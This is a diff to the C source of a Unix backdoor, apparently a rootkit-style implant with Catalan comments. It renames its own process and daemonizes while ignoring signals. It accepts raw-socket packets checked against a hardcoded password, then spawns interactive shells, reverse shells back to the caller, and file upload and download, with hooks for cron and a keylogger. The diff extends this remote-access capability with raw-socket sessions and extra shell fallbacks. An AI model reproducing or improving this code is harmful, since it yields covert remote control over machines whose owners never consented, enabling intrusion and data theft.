@@ -1,33 +1,27 @@
-#include <stdarg.h>
+//#include <stdarg.h>
 #include <string.h>
 #include <stdio.h>
 #include <signal.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include <fcntl.h>
+#include <sys/socket.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <errno.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
 #include <termios.h>
 #include <netdb.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 
-#include "raw.h"
+#include "../include/raw.h"
 #include "../include/config.h"
-#include "../include/actions.h"
-
-#define CHECKSTR "check"
-//#define PS1 "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# "
-#define MAXDIRECTRAW 100
+#include "../include/common.h"
 
 int weekday;
-struct rawsock rawsocks[MAXDIRECTRAW];
+struct rawsock rawsocks[MAXRAWSESSIONS];
 
 char *envp[] = {
      "TERM=linux",
@@ -40,58 +34,25 @@ char *envp[] = {
      NULL
 };
 
-// TODO: Change procname via ptrace
-char  *argv[] = {
-//        PROCNAME,
-      "/bin/sh",
-//      "--noprofile",
-//      "--norc",
-//      "-i",
+char  *argv_bash[] = {
+      "bash",
+      "--noprofile",
+      "--norc",
+      "-i",
       NULL
 };
 
-
-// Debug function
-__inline__ void debug(char * format, ...){
-#if DEBUG
-    va_list args;
-    va_start(args, format);
-    vprintf(format, args);
-    va_end(args);
-#endif
-}
-
-static void sig_child(int sig) {
-    int status;
-    pid_t pid;
-    do {
-        pid = waitpid(-1, &status, WNOHANG);
-    } while (pid > 0 || (pid < 0 && errno == EINTR));
-    signal(SIGCHLD, sig_child);
-}
-
-struct rawsock *findrawsock(int port) {
-    int i;
-    for (i = 0; i < MAXDIRECTRAW; i++) {
-        if (rawsocks[i].id == port) {
-            return &rawsocks[i];
-        }
-    }
-    for (i = 0; i < MAXDIRECTRAW; i++) {
-        if (rawsocks[i].id == 0) {
-            debug("initializing rawsock\n");
-            rawsocks[i].id = port;
-            pipe(rawsocks[i].r);
-            pipe(rawsocks[i].w);
-            rawsocks[i].initialized = 1;
-            return &rawsocks[i];
-        }
+// TODO: Use network check method
+int im_running(){
+    if (0) {
+        debug("I'm running!!!");
+        return 1;
     }
     return 0;
 }
 
-
 // Cron function
+#if CRON
 void cron(int n) {
     char buffer[256];
 
@@ -117,6 +78,7 @@ void cron(int n) {
     // Launched every 24h
     alarm(60*60*24);
 }
+#endif
 
 void rename_proc(char **argv, int argc) {
     int i;
@@ -146,6 +108,7 @@ void daemonize() {
     for (i = 1; i < 64; i++)
         signal(i, SIG_IGN);
 
+    //signal(SIGHUP, SIG_IGN);
     signal(SIGCHLD, sig_child);
 }
 
@@ -167,9 +130,9 @@ void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
     }
 
     bytes=0;
-    while ((bytes = read(fd, &buf, BUFSIZE)) > 0){
+    while ((bytes = read(fd, buf, BUFSIZE)) > 0){
         debug("Sending %d bytes.\n", bytes);
-        if (write(sockw, &buf, bytes) < bytes){
+        if (write(sockw, buf, bytes) < bytes){
             debug("No s'ha enviat tot!\n");
         }
     }
@@ -205,12 +168,18 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
     unsigned char buf[BUFSIZE];
     char *ptr;
     char file_path[256];
+    struct timeval tv;
+    int nfd = 0;
+
+	// Timeout
+	tv.tv_sec=15;
+	tv.tv_usec=0;
 
     ptr = strrchr(file, '/');
     if (ptr) { ptr++;}
     else { ptr = file; }
 
-    if (getuid()) sprintf(file_path,"/var/tmp");
+    if (getuid()) sprintf(file_path,"/var/tmp/%s", ptr);
     else sprintf(file_path, "%s/%s", HOME, ptr);
     fd = open(file_path, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU);
     if (fd < 0){
@@ -220,12 +189,26 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
         exit(0);
     }
     debug("file %s created!\n", file_path);
-
+    
     bytes=0;
-    while ((bytes = read(sockr, &buf, BUFSIZE)) > 0){
-        debug("Received %d bytes.\n", bytes);
-        if (write(fd, &buf, bytes) < bytes){
-            debug("No s'ha guardat tot!\n");
+
+    while (1) {
+        fd_set  fds;
+        FD_ZERO(&fds);
+        FD_SET(sockr, &fds);
+
+        nfd = select(sockr + 1, &fds, NULL, NULL, &tv);
+        if (nfd == 0) break;
+        else if (nfd > 0 && FD_ISSET(sockr, &fds)) {
+            if ((bytes = read(sockr, buf, BUFSIZE)) <= 0 && (errno != EINTR)) {
+                break;
+            } else {
+                errno = 0;
+                debug("Received %d bytes.\n", bytes);
+                if (write(fd, buf, bytes) < bytes){
+                    debug("No s'ha guardat tot!\n");
+                }
+            } 
         }
     }
 
@@ -233,16 +216,12 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
     close(fd);
 }
 
-static inline int max(int a, int b) {
-    return a > b ? a : b;
-}
-
 void launcher_shell(int sockr, int sockw) {
     int tty, pty, subshell;
     unsigned char buf[BUFSIZE];
     // used to get the tty
     extern char *ptsname();
-    struct stat shell;
+	char echar = ECHAR;
 
     pty = open("/dev/ptmx", O_RDWR);
     grantpt(pty);
@@ -271,9 +250,12 @@ void launcher_shell(int sockr, int sockw) {
 
         if (getuid()) chdir("/var/tmp");
         else chdir(HOME);
-       
-        if (stat("/bin/bash", &shell) == 0) execve("/bin/bash", argv, envp);
-        else execve("/bin/sh", argv, envp);
+        
+        execve("/bin/bash", argv_bash, envp);
+        execve("/usr/local/bin/bash", argv_bash, envp);
+        execl("/bin/ksh", "ksh", "-i", NULL);
+        execl("/usr/local/bin/ksh", "ksh", "-i", NULL);
+        execl("/usr/local/bin/csh", "csh", "-i", NULL);
 
         // we should not to be here
         exit(1);
@@ -298,54 +280,63 @@ void launcher_shell(int sockr, int sockw) {
 
             if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
 
-            /* stdin => shell */
+            /* shell => client */
             if (FD_ISSET(pty, &fds)) {
                 count = read(pty, buf, BUFSIZE);
                 if ((count <= 0) && (errno != EINTR)) break;
                 if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
-                /* shell => stdout */
+            /* client => shell */
             } else if (FD_ISSET(sockr, &fds)) {
                 count = read(sockr, buf, BUFSIZE);
                 // TODO: enviar char especial per setejar tamany tty, timeout, etc.
                 if ((count <= 0) && (errno != EINTR)) break;
-                if ((p = memchr(buf, WCHAR, count))){
-                    debug("wchar\n");
-                    struct  winsize ws;
-                    int t;
+                if ((p = memchr(buf, ECHAR, count))){
+                    debug("Received special char\n");
+					if (count == 1) break;
+					else if (count == 5) {
+                    	struct  winsize ws;
+                    	int t;
 
-                    ws.ws_xpixel = ws.ws_ypixel = 0;
-                    ws.ws_col = (p[1] << 8) + p[2];
-                    ws.ws_row = (p[3] << 8) + p[4];
-                    if (ws.ws_col & ws.ws_row) {
-                        ioctl(pty, TIOCSWINSZ, &ws);
-                        kill(0, SIGWINCH);
-                    }
-                    // Write the other data
-                    write(pty, buf, p-buf);
-                    t = (buf+count) - (p+5);
-                    if (t > 0) write(pty, p+5, t);
+                    	ws.ws_xpixel = ws.ws_ypixel = 0;
+                    	ws.ws_col = (p[1] << 8) + p[2];
+                    	ws.ws_row = (p[3] << 8) + p[4];
+                    	if (ws.ws_col & ws.ws_row) {
+                    	    ioctl(pty, TIOCSWINSZ, &ws);
+                    	    kill(0, SIGWINCH);
+                    	}
+                    	// Write the other data
+                    	write(pty, buf, p-buf);
+                    	t = (buf+count) - (p+5);
+                    	if (t > 0) write(pty, p+5, t);
+					}
                 } 
-                else if (memchr(buf, ECHAR, count)) break;
                 else if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
             }
         }
     }   
+					
+	// stop the client
+	debug("Stopping client\n");
+	write(sockw, &echar, 1); 
+	sleep(1);
+	write(sockw, &echar, 1); 
     close(pty);
     debug("Waiting child\n");
     waitpid(subshell, NULL, 0);
 }
 
-void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
-    if (fork() != 0){
-        return;
-    }
-
+void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
+    struct rawsock *r;
     switch(d->action) {
         case UPLOAD:
             debug("Uploading file\n");
             if (!getuid()) {
                 debug("Can not transfer files using direct RAW\n");
+                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
+    			if (fork()) return;
+                launcher_upload(r->r[0], r->w[1], (char *)d->bytes, d->size);
             } else {
+    			if (fork()) return;
                 launcher_upload(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
             }
@@ -354,7 +345,13 @@ void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
             debug("Downloading file\n");
             if (!getuid()) {
                 debug("Can not transfer files using direct RAW\n");
+                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
+    			if (fork()) return;
+                launcher_download(r->r[0], r->w[1], (char *)d->bytes, d->size);
+				stop_rawsock_partner(r, (unsigned char *)SERVERAUTH);
+				destroy_rawsock_session(r);
             } else {
+    			if (fork()) return;
                 launcher_download(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
             }
@@ -363,43 +360,55 @@ void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
             debug("Launching shell\n");
             if (!getuid()) {
                 debug("Starting DirectRAW service\n");
-                struct rawsock *r = findrawsock(d->port);
-                int pid;
-                if ((pid = swapd_raw(r, ip->s_addr, source, d->port, (unsigned char *)SERVERAUTH)) > 0) {
-                    debug("done!\n");
-                    launcher_shell(r->r[0], r->w[1]);
-                    kill(pid, 15);
-                }
+                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
+    			if (fork()) return;
+                launcher_shell(r->r[0], r->w[1]);
+				destroy_rawsock_session(r);
             } else {
+    			if (fork()) return;
                 launcher_shell(sock, sock);
                 close(sock);
             }
             break;
-        case RUPLOAD:
+        case REVUPLOAD:
+    		if (fork()) return;
             debug("Reverse uploading file\n");
             if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_upload(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
             }
             break;
-        case RDOWNLOAD:
+        case REVDOWNLOAD:
+    		if (fork()) return;
             debug("Reverse downloading file\n");
             if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_download(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
             }
             break;
-        case RSHELL:
+        case REVSHELL:
+    		if (fork()) return;
             debug("Launching reverse shell\n");
             if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_shell(sock, sock);
                 close(sock);
             }
             break;
-		case SOCKS:
-			break;
+        case RAWSESSION:
+            debug("Raw session packet\n");
+            r = find_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
+            fill_rawsock_session(r, d->bytes, d->size);
+            return;
+            break;
+        case STOPRAWSESSION:
+            debug("Client destroyed the rawsocksession\n");
+            r = find_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
+			destroy_rawsock_session(r);	
+            return;
+            break;
         default:
             debug("Invalid option: %d\n", d->action);
+            return;
     }
     debug("Connection closed\n");
     exit(0);
@@ -443,7 +452,7 @@ void tcp_daemon(int port) {
             debug("Error: accept\n");
             exit(-1);
         }
-        debug("Received connection!\n");
+        printf("Received connection!\n");
         if (!fork()) {
             close(sock);
             if ((bytes = read(sock_con, &d, sizeof(struct data))) != sizeof(struct data)) {
@@ -475,47 +484,19 @@ void raw_daemon() {
         exit(-1);
     }
 
-    // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
     while (1) {
         size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
         // Si el tamany del paquet es el que toca
         if (size == sizeof(struct packet)) {
             // I el password és correcte
             if (!memcmp(CLIENTAUTH, p.action.pass, 20)) {
-                debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
-                //If has the RESET flag, is a direct raw packet
-                if (p.tcp.rst) {
-                    debug("packet de sessio RAW (%d bytes)\n", p.action.size);
-                    fill_raw_connection(findrawsock(p.action.port), p.action.bytes, p.action.size);
-                } else {
-                    debug("packet normal RAW %d => %d\n", ntohs(p.tcp.source), ntohs(p.tcp.dest));
-                    do_action(&(p.action), &raw.sin_addr, ntohs(p.tcp.dest), 0);
-                }
+                debug("S'ha rebut el paquet d'autenticat (action: %d)\n", p.action.action);
+                do_action(&(p.action), &raw.sin_addr, ntohs(p.tcp.dest), 0);
             }
         }
     }
 }
 
-unsigned long resolve(const char *host, char *ip) {
-    struct hostent *he;
-    struct sockaddr_in si;
-
-    he = gethostbyname(host);
-    if (!he) {
-        return INADDR_NONE;
-    }
-    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
-    strcpy(ip, inet_ntoa(si.sin_addr));
-    return si.sin_addr.s_addr;
-}
-
-
-/*
- * How to launch the server:
- * 1 => without params as root for a raw socket
- * 2 => with only on param for a tcp socket (param = listen port)
- * 3 => with two params for a connect back shell
- */
 int main(int argc, char **argv) {
     int port = 0;
 
@@ -544,18 +525,23 @@ int main(int argc, char **argv) {
 
     // Check if we are running
 
+
     // Change proc name
     rename_proc(argv, argc);
 
     // Daemonize
 #if ! DEBUG
     daemonize();
+#else
+    signal(SIGCHLD, sig_child);
 #endif
 
     // Cron
+#if CROND
     debug("Initializing crond\n");
     signal(SIGALRM, cron);
     alarm(60*60*24);
+#endif
 
 #ifdef KEYLOGGER
     debug("Initializing keylogger\n");
